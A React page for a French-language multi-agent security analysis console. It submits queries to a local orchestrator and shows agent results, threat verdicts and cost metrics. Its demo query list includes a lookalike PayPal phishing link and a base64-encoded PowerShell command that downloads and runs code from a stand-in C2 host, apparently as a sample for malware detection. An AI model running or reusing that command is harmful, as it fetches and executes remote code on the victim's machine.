"use client";

import { useState, useCallback } from "react";
import { PageHeader } from "@/components/layout/PageHeader";
import { Card } from "@/components/ui/Card";
import { StatCard } from "@/components/ui/StatCard";
import { VerdictPill } from "@/components/ui/VerdictPill";
import { ThreatBar } from "@/components/ui/ThreatBar";
import {
  Brain,
  GitBranch,
  Activity,
  Shield,
  Cpu,
  Timer,
  Network,
  Bot,
  Workflow,
  Layers,
  Target,
  Search,
  AlertTriangle,
  CircleCheckBig,
  MessageSquare,
  BarChart3,
  Play,
  LoaderCircle,
} from "lucide-react";

const AGENT_ICONS: Record<string, React.ReactNode> = {
  query_classifier: <Search className="w-4 h-4" />,
  model_router: <GitBranch className="w-4 h-4" />,
  security_rag: <Layers className="w-4 h-4" />,
  threat_intelligence: <Network className="w-4 h-4" />,
  sigma_analysis: <Target className="w-4 h-4" />,
  malware_analysis: <AlertTriangle className="w-4 h-4" />,
  incident_response: <Shield className="w-4 h-4" />,
  evidence_fusion: <Brain className="w-4 h-4" />,
  securityllm_synthesis: <MessageSquare className="w-4 h-4" />,
  ai_governance: <Activity className="w-4 h-4" />,
};

const AGENT_LABELS: Record<string, string> = {
  query_classifier: "Query Classifier",
  model_router: "Model Router",
  security_rag: "Security RAG",
  threat_intelligence: "Threat Intelligence",
  sigma_analysis: "Sigma Analysis",
  malware_analysis: "Malware Analysis",
  incident_response: "Incident Response",
  evidence_fusion: "Evidence Fusion",
  securityllm_synthesis: "SecurityLLM Synthesis",
  ai_governance: "AI Governance",
};

function AgentNode({
  name,
  status,
  latency,
  confidence,
  isActive,
}: {
  name: string;
  status: "success" | "error" | "pending" | "idle";
  latency?: number;
  confidence?: number;
  isActive: boolean;
}) {
  const colors = {
    success: { bg: "rgba(34,197,94,.1)", border: "rgba(34,197,94,.3)", text: "rgb(34,197,94)" },
    error: { bg: "rgba(239,68,68,.1)", border: "rgba(239,68,68,.3)", text: "rgb(239,68,68)" },
    pending: { bg: "rgba(234,179,8,.1)", border: "rgba(234,179,8,.3)", text: "rgb(234,179,8)" },
    idle: { bg: "rgba(255,255,255,.03)", border: "rgba(255,255,255,.07)", text: "rgb(148,163,184)" },
  };
  const c = colors[status];

  return (
    <div
      style={{
        background: c.bg,
        border: `1px solid ${c.border}`,
        borderRadius: 12,
        padding: "0.75rem 1rem",
        transition: "all .3s ease",
        opacity: isActive ? 1 : 0.5,
        transform: isActive ? "translateY(0)" : "translateY(2px)",
      }}
    >
      <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 4 }}>
        <span style={{ color: c.text }}>{AGENT_ICONS[name] || <Bot className="w-4 h-4" />}</span>
        <span style={{ fontSize: "0.8rem", fontWeight: 600, color: "rgb(240,244,255)" }}>
          {AGENT_LABELS[name] || name}
        </span>
        {status === "success" && <CircleCheckBig className="w-3.5 h-3.5" style={{ color: "rgb(34,197,94)", marginLeft: "auto" }} />}
        {status === "error" && <AlertTriangle className="w-3.5 h-3.5" style={{ color: "rgb(239,68,68)", marginLeft: "auto" }} />}
        {status === "pending" && <LoaderCircle className="w-3.5 h-3.5 animate-spin" style={{ color: "rgb(234,179,8)", marginLeft: "auto" }} />}
      </div>
      <div style={{ display: "flex", gap: 12, fontSize: "0.7rem", color: "rgb(148,163,184)" }}>
        {latency !== undefined && <span>⏱ {latency}ms</span>}
        {confidence !== undefined && <span>🎯 {(confidence * 100).toFixed(0)}%</span>}
      </div>
    </div>
  );
}

function WorkflowFlow({ agents, results }: { agents: string[]; results: Record<string, any> }) {
  return (
    <div style={{ display: "flex", flexDirection: "column", gap: 8, position: "relative" }}>
      {agents.map((name, i) => {
        const r = results[name];
        const status = !r ? "pending" : r.success ? "success" : "error";
        return (
          <div key={name}>
            <AgentNode
              name={name}
              status={r ? (r.success ? "success" : "error") : "pending"}
              latency={r?.latency_ms}
              confidence={r?.confidence}
              isActive={true}
            />
            {i < agents.length - 1 && (
              <div style={{ display: "flex", justifyContent: "center", padding: "4px 0" }}>
                <div style={{ width: 2, height: 16, background: "rgba(99,102,241,.3)", borderRadius: 1 }} />
              </div>
            )}
          </div>
        );
      })}
    </div>
  );
}

const DEMO_QUERIES = [
  "Analyse cet email: Votre compte PayPal a ete suspendu. Cliquez ici: http://paypa1-secure.xyz/verify?token=abc123",
  "Alerte SOC: Tentative de brute force SSH sur 192.168.1.100 avec 47 echecs en 3 minutes",
  "Analyse ce malware: powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAHcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC0AcwBlAHIAdgBlAHIALgB0AG8AcgAuAG4AZQB0AHcAbwByAGsALwBgACkA",
  "Quelles sont les techniques MITRE ATT&CK utilisees par les ransomwares?",
];

export default function OrchestratePage() {
  const [query, setQuery] = useState("");
  const [result, setResult] = useState<any>(null);
  const [loading, setLoading] = useState(false);
  const [activeTab, setActiveTab] = useState<"agents" | "workflow" | "evidence" | "metrics">("workflow");

  const handleSubmit = useCallback(async () => {
    if (!query.trim()) return;
    setLoading(true);
    setResult(null);
    try {
      const r = await fetch("http://localhost:8080/api/v1/security/query", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ query, user_role: "analyst" }),
      });
      const d = await r.json();
      setResult(d);
    } catch (e: any) {
      setResult({ success: false, error: e.message });
    } finally {
      setLoading(false);
    }
  }, [query]);

  const loadDemo = useCallback(() => {
    const idx = Math.floor(Math.random() * DEMO_QUERIES.length);
    setQuery(DEMO_QUERIES[idx]);
  }, []);

  const agents = result?.agents_used || [];
  const results = result?.results || {};
  const evidence = result?.evidence || {};
  const threat = evidence.threat_assessment || {};
  const governance = result?.governance || {};

  return (
    <div className="space-y-6">
      <PageHeader
        icon={<Brain className="w-6 h-6" />}
        title="AI Orchestrator"
        description="Console de pilotage multi-agent — orchestration intelligente des modeles de securite"
      />

      {/* Query Input */}
      <Card>
        <div style={{ display: "flex", flexDirection: "column", gap: 12 }}>
          <label style={{ fontSize: "0.8rem", fontWeight: 600, color: "rgb(148,163,184)" }}>
            Requete de securite
          </label>
          <textarea
            className="input-area"
            value={query}
            onChange={(e) => setQuery(e.target.value)}
            placeholder="Saisissez votre requete de securite (analyse phishing, assistance SOC, investigation malware...)"
            rows={4}
            style={{
              background: "rgba(0,0,0,.35)",
              border: "1px solid rgba(255,255,255,.07)",
              borderRadius: 12,
              color: "rgb(240,244,255)",
              padding: "0.75rem 1rem",
              fontSize: "0.9rem",
              resize: "vertical",
              fontFamily: "inherit",
            }}
          />
          <div style={{ display: "flex", gap: 8 }}>
            <button
              className="btn btn-primary"
              onClick={handleSubmit}
              disabled={loading || !query.trim()}
              style={{ display: "flex", alignItems: "center", gap: 6 }}
            >
              {loading ? <LoaderCircle className="w-4 h-4 animate-spin" /> : <Play className="w-4 h-4" />}
              {loading ? "Analyse en cours..." : "Executer l'orchestration"}
            </button>
            <button className="btn btn-secondary" onClick={loadDemo}>
              Demo
            </button>
          </div>
        </div>
      </Card>

      {/* Results */}
      {result && (
        <div className="space-y-6">
          {/* Header Stats */}
          {result.success && (
            <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(180px, 1fr))", gap: 12 }}>
              <StatCard
                icon={<Brain className="w-5 h-5" />}
                label="Classification"
                value={result.classification?.replace(/_/g, " ")}
                tone="primary"
              />
              <StatCard
                icon={<Workflow className="w-5 h-5" />}
                label="Workflow"
                value={result.workflow?.replace(/_/g, " ")}
                tone="info"
              />
              <StatCard
                icon={<Bot className="w-5 h-5" />}
                label="Agents"
                value={`${agents.length}`}
                tone="accept"
              />
              <StatCard
                icon={<Timer className="w-5 h-5" />}
                label="Latence"
                value={`${result.latency_ms?.toFixed(0)}ms`}
                tone="primary"
              />
            </div>
          )}

          {result.success && (
            <Card>
              <div style={{ display: "flex", gap: 8, marginBottom: 16, borderBottom: "1px solid rgba(255,255,255,.07)", paddingBottom: 12 }}>
                {(["workflow", "agents", "evidence", "metrics"] as const).map((tab) => (
                  <button
                    key={tab}
                    onClick={() => setActiveTab(tab)}
                    style={{
                      padding: "0.4rem 1rem",
                      borderRadius: 8,
                      border: "none",
                      background: activeTab === tab ? "rgba(99,102,241,.15)" : "transparent",
                      color: activeTab === tab ? "rgb(99,102,241)" : "rgb(148,163,184)",
                      fontWeight: 600,
                      fontSize: "0.8rem",
                      cursor: "pointer",
                      textTransform: "capitalize",
                    }}
                  >
                    {tab}
                  </button>
                ))}
              </div>

              {activeTab === "workflow" && (
                <div style={{ display: "grid", gridTemplateColumns: "250px 1fr", gap: 24 }}>
                  <WorkflowFlow agents={agents} results={results} />
                  <div>
                    <div style={{ fontSize: "0.85rem", fontWeight: 700, color: "rgb(240,244,255)", marginBottom: 12 }}>
                      Evidence Fusion
                    </div>
                    {threat.verdict && (
                      <div style={{ display: "flex", gap: 16, alignItems: "center", marginBottom: 16 }}>
                        <VerdictPill verdict={threat.verdict} />
                        <span style={{ fontSize: "0.8rem", color: "rgb(148,163,184)" }}>
                          Confiance: {(threat.confidence * 100).toFixed(1)}%
                        </span>
                      </div>
                    )}
                    <ThreatBar score={threat.average_threat_score || 50} />
                    <div style={{ marginTop: 12, fontSize: "0.75rem", color: "rgb(148,163,184)", lineHeight: 1.6 }}>
                      <div>Modeles: {evidence.summary?.total_models || 0}</div>
                      <div>Block: {evidence.summary?.block_votes || 0} / Accept: {evidence.summary?.accept_votes || 0}</div>
                      <div>Latence totale: {evidence.summary?.total_latency_ms?.toFixed(0)}ms</div>
                    </div>
                  </div>
                </div>
              )}

              {activeTab === "agents" && (
                <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fill, minmax(280px, 1fr))", gap: 8 }}>
                  {agents.map((name: string) => {
                    const r = results[name];
                    return (
                      <AgentNode
                        key={name}
                        name={name}
                        status={r?.success ? "success" : "error"}
                        latency={r?.latency_ms}
                        confidence={r?.confidence}
                        isActive={true}
                      />
                    );
                  })}
                </div>
              )}

              {activeTab === "evidence" && (
                <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 16 }}>
                  <div>
                    <div style={{ fontSize: "0.8rem", fontWeight: 700, marginBottom: 8, color: "rgb(148,163,184)" }}>
                      Modeles
                    </div>
                    {Object.entries(evidence.models || {}).map(([id, m]: [string, any]) => (
                      <div key={id} style={{
                        display: "flex", justifyContent: "space-between", alignItems: "center",
                        padding: "0.4rem 0.75rem", marginBottom: 4,
                        background: "rgba(255,255,255,.03)", borderRadius: 8,
                        fontSize: "0.78rem",
                      }}>
                        <span style={{ color: "rgb(240,244,255)", fontWeight: 600 }}>{id}</span>
                        <span style={{ color: m.verdict === "BLOCK" ? "rgb(239,68,68)" : m.verdict === "ACCEPT" ? "rgb(34,197,94)" : "rgb(234,179,8)" }}>
                          {m.verdict}: {m.threat_score}%
                        </span>
                      </div>
                    ))}
                  </div>
                  <div>
                    <div style={{ fontSize: "0.8rem", fontWeight: 700, marginBottom: 8, color: "rgb(148,163,184)" }}>
                      Synthesis
                    </div>
                    {result.response && (
                      <div style={{
                        fontSize: "0.75rem", lineHeight: 1.6, color: "rgb(203,213,225)",
                        background: "rgba(0,0,0,.25)", padding: "0.75rem", borderRadius: 8,
                        maxHeight: 300, overflowY: "auto", whiteSpace: "pre-wrap",
                      }}>
                        {result.response}
                      </div>
                    )}
                  </div>
                </div>
              )}

              {activeTab === "metrics" && (
                <div>
                  <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(200px, 1fr))", gap: 12, marginBottom: 16 }}>
                    <StatCard icon={<Activity className="w-5 h-5" />} label="Success Rate" value={governance?.audit?.success_rate ? `${(governance.audit.success_rate * 100).toFixed(0)}%` : "N/A"} tone="accept" />
                    <StatCard icon={<Cpu className="w-5 h-5" />} label="Avg. Latency" value={governance?.performance?.average_latency_ms ? `${governance.performance.average_latency_ms.toFixed(0)}ms` : "N/A"} tone="primary" />
                    <StatCard icon={<BarChart3 className="w-5 h-5" />} label="Avg. Confidence" value={governance?.performance?.average_confidence ? `${(governance.performance.average_confidence * 100).toFixed(0)}%` : "N/A"} tone="info" />
                    <StatCard icon={<Shield className="w-5 h-5" />} label="Governance" value={governance?.governance_status || "N/A"} tone={governance?.governance_status === "COMPLIANT" ? "accept" : "warn"} />
                  </div>
                  {governance?.costs?.breakdown && (
                    <div>
                      <div style={{ fontSize: "0.8rem", fontWeight: 600, marginBottom: 8, color: "rgb(148,163,184)" }}>
                        Cost Breakdown
                      </div>
                      {Object.entries(governance.costs.breakdown).map(([agent, cost]: [string, any]) => (
                        <div key={agent} style={{
                          display: "flex", justifyContent: "space-between",
                          padding: "0.3rem 0.75rem", fontSize: "0.75rem",
                          color: "rgb(148,163,184)",
                        }}>
                          <span>{agent}</span>
                          <span>${(cost as number).toFixed(6)}</span>
                        </div>
                      ))}
                    </div>
                  )}
                </div>
              )}
            </Card>
          )}

          {!result.success && (
            <Card>
              <div style={{ color: "rgb(239,68,68)", fontSize: "0.85rem" }}>
                Erreur: {result.error || "Erreur inconnue"}
                <p style={{ color: "rgb(148,163,184)", fontSize: "0.75rem", marginTop: 8 }}>
                  Verifiez que l'orchestrateur est lance sur le port 8080
                </p>
              </div>
            </Card>
          )}
        </div>
      )}
    </div>
  );
}
